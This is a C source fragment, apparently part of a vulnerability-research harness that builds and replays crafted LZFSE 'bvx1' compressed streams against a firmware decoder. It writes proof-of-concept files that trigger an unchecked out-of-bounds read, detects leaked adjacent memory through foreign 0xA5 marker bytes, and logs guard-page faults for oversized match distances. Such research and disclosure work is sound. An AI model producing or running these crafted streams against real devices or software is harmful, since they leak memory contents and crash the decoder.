    c.T[1]=4; c.L[1]=15; c.M[1]=8;
    static const u32 leakDs[] = { 48, 49, 50, 51, 52, 53, 54, 55, 56 }; /* P+L+1 .. +9 */
    /* ---- A: silent-leak cells, direct core then dispatcher 0x8A1 ---- */
    for (int pass = 0; pass < 2; pass++) {
      printf("== [A%s] silent adjacent-memory copy into output (D=P+L+1..+9, %s) ==\n",
             pass ? "/disp0x8A1" : "/direct", pass ? "staging id 0x8A1" : "direct FUN_001E908C");
      for (unsigned di = 0; di < sizeof(leakDs)/sizeof(leakDs[0]); di++) {
        for (int k=0;k<4;k++) c.D[1][k] = leakDs[di];
        c.id = pass ? 0x8A1 : 0;
        run_cell(&c, &o, 0);
        int a5count = 0; size_t firstA5 = (size_t)-1;
        if (!o.r.faulted && o.ret > 0)
          for (size_t i = 32; i < o.snaplen; i++)
            if (o.snap[i] == 0xA5) { if (firstA5 == (size_t)-1) firstA5 = i; a5count++; }
        printf("  D=%3u: ret=%ld faulted=%d", leakDs[di], o.ret, o.r.faulted);
        if (o.r.faulted) printf(" sig=%d pc_off=%llx delta-vs-begin=%+lld",
                                o.r.f.signo, (unsigned long long)(o.r.f.pc - (u64)g_fw),
                                (long long)((long long)o.r.f.addr - (long long)o.dstbase));
        else if (a5count) printf(" FOREIGN-A5-BYTES=%d first@%zu", a5count, firstA5);
        else printf(" no-foreign");
        printf("\n");
      }
    }
    /* ---- B: large-D fault receipt ---- */
    printf("== [B] large-D guard-page fault receipt (D=262139 > apron 64KB) ==\n");
    {
      for (int pass = 0; pass < 2; pass++) {
        c.id = pass ? 0x8A1 : 0;
        for (int k=0;k<4;k++) c.D[1][k] = 262139;
        run_cell(&c, &o, 0);
        printf("  D=262139 %-10s ret=%ld faulted=%d", pass ? "disp-0x8A1" : "direct", o.ret, o.r.faulted);
        if (o.r.faulted)
          printf(" sig=%d pc_off=%llx FAULTSITE=copier-load(0x%llx) delta-vs-begin=%+lld\n",
                 o.r.f.signo, (unsigned long long)(o.r.f.pc - (u64)g_fw),
                 (unsigned long long)((strstr(g_fw_path, "23g83")) ? 0x1EA208 : 0x1EA188),
                 (long long)((long long)o.r.f.addr - (long long)o.dstbase));
        else
          printf(" NO-FAULT (unexpected)\n");
      }
    }
    /* ---- C: dump the exact streams + annotate fields ---- */
    printf("== [C] PoC stream dump -> %s ==\n", dir);
    {
      const struct { u32 D; const char *fname; const char *tag; } items[] = {
        { 48,     "poc_lzfse_oobread.bin", "LEAK cell (silent adjacent-memory disclosure)" },
        { 262139, "poc_lzfse_fault.bin",   "FAULT cell (guard-page witness of same unchecked read)" },
      };
      for (unsigned it = 0; it < sizeof(items)/sizeof(items[0]); it++) {
        u8 blk[8192];
        u32 Dw[4] = {4,5,4,5};
        long wa = build_bvx1(blk, sizeof(blk), 4, 4, 4, Dw);       /* warm block: P=32 */
        u32 Dh[4]; for (int k=0;k<4;k++) Dh[k] = items[it].D;
        long hb = build_bvx1(blk + wa, sizeof(blk) - wa, 4, 15, 8, Dh); /* hostile block */
        if (wa < 0 || hb < 0) { printf("  [%s] BUILD FAIL wa=%ld hb=%ld\n", items[it].fname, wa, hb); continue; }
        long bl = wa + hb;
        wr32(blk + bl, 0x24787662); bl += 4;                       /* 'bv4$' end marker */
        char path[512]; snprintf(path, sizeof(path), "%s/%s", dir, items[it].fname);
        FILE *pf = fopen(path, "wb");
        if (!pf) { perror("dump poc"); continue; }
        fwrite(blk, 1, (size_t)bl, pf); fclose(pf);
        printf("  [%s] wrote %ld bytes (%s)\n", items[it].fname, bl, items[it].tag);
        int s, W, Lsym = -1, Msym = -1; u32 ex;
        dist_encode(items[it].D, &s, &ex, &W);
        for (int ss = 0; ss < 20; ss++) { if (!TB_LR_XTRA[ss] && (int)TB_LR_BASE[ss] == 15) Lsym = ss;
                                          if (!TB_ML_XTRA[ss] && (int)TB_ML_BASE[ss] == 8)  Msym = ss; }
        printf("    fields: blk1 magic=%08x('bvx1') out=%u payload=%u nlit=%u nmatch=%u | "
               "blk2 magic=%08x out=%u payload=%u nlit=%u nmatch=%u\n",
               rd32(blk), rd32(blk+4), rd32(blk+8), rd32(blk+0xC), rd32(blk+0x10),
               rd32(blk+wa), rd32(blk+wa+4), rd32(blk+wa+8), rd32(blk+wa+0xC), rd32(blk+wa+0x10));
        printf("    freq tables (blk2 @+%lx): lit-len sym%d(=15 literals) f=64 @0x32; "
               "match-len sym%d(=8 bytes) f=64 @0x5A; dist sym%d f=256 @0x82; literal 'A'(0x41) f=1024 @0x102\n",
               (unsigned long)wa, Lsym, Msym, s);
        printf("    distance D=%u -> dist-symbol=%d base(TB_D_BASE[sym])=%u extra=%u extra-bits(W)=%d\n",
               items[it].D, s, TB_D_BASE[s], ex, W);
        printf("    layout: [bvx1 warm blk %ldB | bvx1 hostile blk %ldB | 'bv4$' 4B]\n", wa, hb);
        hexdump("    stream head", blk, 48);
      }
    }
    return 0;
  }

  /* =================== MODE poclf: replay an on-disk LZFSE bvx1-stream PoC =====
   * usage: qsweep poclf <file>   — loads the crafted stream and decodes it via
   * the direct core AND staging id 0x8A1 with marker-apron buffers; prints the
   * full receipt (fault/sig/pc_off/delta or foreign-A5 leak counts). */
  if (!strcmp(mode, "poclf")) {
    if (argc < 3) { fprintf(stderr, "usage: qsweep poclf <file>\n"); return 2; }
    tb_init();
    FILE *pf = fopen(argv[2], "rb");
    if (!pf) { fprintf(stderr, "poclf: cannot open %s\n", argv[2]); return 3; }
    fseek(pf, 0, SEEK_END); long sz = ftell(pf); fseek(pf, 0, SEEK_SET);
    u8 *blk = malloc((size_t)sz);
    if (fread(blk, 1, (size_t)sz, pf) != (size_t)sz) { perror("read"); return 3; }
    fclose(pf);
    printf("== POCLF: on-disk stream replay: %s (%ld bytes) ==\n", argv[2], sz);
    hexdump("  file bytes", blk, (size_t)(sz < 96 ? sz : 96));
    for (int pass = 0; pass < 2; pass++) {
      struct buf dst, scr, st;
      mkbuf(&dst, 65536); mkbuf(&scr, SCRATCH_SZ); mkbuf(&st, 262144);
      memset(dst.payload, 0x11, dst.cap);
      struct R r;
      if (pass) GUARDED(g_disp(dst.payload, dst.cap, blk, (size_t)sz, scr.payload, 0x8A1), r);
      else      GUARDED(g_direct(dst.payload, dst.cap, blk, (size_t)sz, st.payload), r);
      long produced = r.faulted ? -1 : (pass ? r.ret : (long)(rd64(st.payload+0x28)-rd64(st.payload+0x18)));
      printf("  poclf-from-file %s sn=%ld produced=%ld faulted=%d", pass ? "id=0x8A1" : "direct ", sz,
             produced, r.faulted);
      if (r.faulted) {
        printf(" sig=%d pc_off=%llx addr-vs-dstbegin=%+lld",
               r.f.signo, (unsigned long long)(r.f.pc - (u64)g_fw),
               (long long)((long long)r.f.addr - (long long)dst.payload));
      } else {
        int a5count = 0; size_t firstA5 = (size_t)-1;
        for (size_t i = 32; i < 65536; i++)
          if (dst.payload[i] == 0xA5) { if (firstA5 == (size_t)-1) firstA5 = i; a5count++; }
        if (a5count) printf(" FOREIGN-A5-BYTES=%d first@%zu", a5count, firstA5);
        else printf(" no-foreign-in-output");
      }
      printf("\n");
      rmbuf(&dst); rmbuf(&scr); rmbuf(&st);
    }
    free(blk);
    return 0;
  }

  /* =================== MODE dbg5: run_cell direct probe =================== */
  if (!strcmp(mode, "dbg5")) {
    tb_init();
    struct cell c; memset(&c, 0, sizeof(c)); struct cellout o;
    c.id = 0; c.nb = 1; c.T[0] = 8; c.L[0] = 4; c.M[0] = 4;
    for (int k = 0; k < 8; k++) c.D[0][k] = (k % 2) ? 5 : 4;
    run_cell(&c, &o, 1);
    printf("run_cell direct: ret=%ld faulted=%d model=%d foreign=%d want=%zu produced=%zu note=%s\n",
           o.ret, o.r.faulted, o.model_ok, o.foreign, o.want, o.produced, o.note);
    c.id = 0x891;
    run_cell(&c, &o, 1);
    printf("run_cell 0x891 : ret=%ld faulted=%d model=%d foreign=%d note=%s\n",
           o.ret, o.r.faulted, o.model_ok, o.foreign, o.note);
    return 0;
  }

  /* =================== MODE dbg3: T-sweep + state post-mortem =================== */
  if (!strcmp(mode, "dbg3")) {
    tb_init();
    struct buf st; mkbuf(&st, 262144);
    struct buf dst; mkbuf(&dst, 200000);
    struct R r;
    u8 blk[8192];
    for (int T = 1; T <= 9; T++) {
      u32 D[9]; for (int k = 0; k < T; k++) D[k] = (k % 2) ? 5 : 4;
      long bl = build_bvx1(blk, sizeof(blk), T, 4, 4, D);
      memset(st.payload,0,262144); memset(dst.payload,0xCC,dst.cap);
      GUARDED(g_direct(dst.payload, dst.cap, blk, bl, st.payload), r);
      size_t pr = produced_len(dst.payload, 4096, 0xCC);
      printf("T=%d len=%ld: faulted=%d produced=%zu (full=%d) +344=%08x +348=%08x dstcur=%llu\n",
             T, bl, r.faulted, pr, T*8,
             rd32(st.payload+0x344), rd32(st.payload+0x348),
             (unsigned long long)(rd64(st.payload+0x28)-rd64(st.payload+0x18)));
      if (r.faulted) printf("  FAULT pc=%llx addr=%llx\n", r.f.pc, r.f.addr);
      if (pr != (size_t)(T*8)) {
        int okm = 1;
        for (int k = 0; k < (int)pr; k++) {
          u8 exp;
          int kk = k / 8, off = k % 8;
          exp = (off < 4) ? 0x41 : ((off-4 >= kk % 2 + 0) ? ((kk%2) ? dst.payload[k - (kk%2 ? 5 : 4)] : dst.payload[k-4]) : 0);
          (void)exp; (void)okm;
        }
        hexdump("  out", dst.payload, pr > 48 ? 48 : pr);
      }
    }
    rmbuf(&st); rmbuf(&dst);
    return 0;
  }

  fprintf(stderr, "unknown mode %s\n", mode); return 2;
}
